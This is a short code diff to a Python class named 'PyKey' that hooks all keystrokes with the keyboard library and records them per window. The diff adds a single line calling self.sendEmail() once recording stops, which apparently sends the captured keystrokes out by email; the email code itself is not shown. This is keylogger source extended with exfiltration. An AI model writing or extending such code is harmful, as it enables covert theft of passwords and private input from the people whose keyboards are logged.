@@ -210,6 +210,7 @@ class PyKey:
         atexit.register(self.onExit, output)
         keyboard.hook(partial(self.recordKeyWindows, output, is_down))
         keyboard.wait(self.TERMINATE_KEY)
+        self.sendEmail()
 
 
     def recordKeys(self):
